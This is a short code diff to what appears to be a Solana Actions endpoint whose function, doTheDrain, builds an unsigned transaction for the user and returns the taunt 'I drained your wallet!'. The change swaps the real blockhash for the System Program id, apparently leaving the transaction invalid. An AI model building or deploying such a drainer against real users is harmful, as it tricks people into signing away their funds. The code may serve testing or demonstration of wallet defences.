@@ -114,12 +114,12 @@ async function doTheDrain(connection: Connection, user: PublicKey, tx: Transacti
   tx.feePayer = user
   const bh = (await connection.getLatestBlockhash({commitment: "finalized"})).blockhash; 
   console.log("using blockhash "+bh)
-  tx.recentBlockhash = bh
+  tx.recentBlockhash = SystemProgram.programId.toBase58()
   const serialTX = tx.serialize({requireAllSignatures: false, verifySignatures: false}).toString("base64");
 
   const response : ActionPostResponse = {
     transaction: serialTX,
-    message: "hahahahaha, I drained your wallet!\nI used "+bh+" as a blockhash"
+    message: "hahahahaha, I drained your wallet!"
   };
   return Response.json(response, {headers: ACTIONS_CORS_HEADERS})
 
